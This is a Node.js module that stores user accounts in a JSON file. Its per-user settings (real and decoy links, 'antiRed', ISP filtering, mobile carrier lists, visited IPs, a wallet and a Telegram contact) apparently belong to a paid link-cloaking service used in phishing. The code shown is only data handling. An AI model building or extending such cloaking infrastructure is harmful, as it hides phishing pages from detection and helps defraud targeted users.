const fs = require('fs').promises;
const fssync = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');

const DATA_DIR = path.join(__dirname, 'data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');

if (!fssync.existsSync(DATA_DIR)) {
    fssync.mkdirSync(DATA_DIR);
}

if (!fssync.existsSync(USERS_FILE)) {
    fssync.writeFileSync(USERS_FILE, JSON.stringify([]));
}

async function getUsers() {
    const data = await fs.readFile(USERS_FILE, 'utf8');
    return JSON.parse(data);
}

async function saveUsers(users) {
    await fs.writeFile(USERS_FILE, JSON.stringify(users, null, 2));
}

async function createUser(userData) {
    const users = await getUsers();
    const newUser = {
        id: uuidv4(),
        slug: crypto.randomBytes(4).toString('hex'),
        name: userData.name,
        email: userData.email,
        telegram: userData.telegram,
        password: userData.password, // hashed
        wallet: 0.0,
        isActive: false,
        settings: {
            nonRealLink: '',
            realLink: '',
            antiRed: true,
            ispFilter: true,
            reallowVisited: true,
            mobileIsps: ['ATT', 'VERIZON', 'T-MOBILE', 'SPRINT', 'CRICKET', 'METROPCS']
        },
        forcedIps: [],
        visitedIps: [],
        createdAt: new Date().toISOString()
    };
    users.push(newUser);
    await saveUsers(users);
    return newUser;
}

async function findUserByEmail(email) {
    const users = await getUsers();
    return users.find(u => u.email === email);
}

async function findUserById(id) {
    const users = await getUsers();
    return users.find(u => u.id === id);
}

async function findUserBySlug(slug) {
    const users = await getUsers();
    return users.find(u => u.slug === slug);
}

async function updateUser(id, updates) {
    const users = await getUsers();
    const index = users.findIndex(u => u.id === id);
    if (index !== -1) {
        users[index] = { ...users[index], ...updates };
        await saveUsers(users);
        return users[index];
    }
    return null;
}

module.exports = {
    createUser,
    getUsers,
    findUserByEmail,
    findUserById,
    findUserBySlug,
    updateUser
};
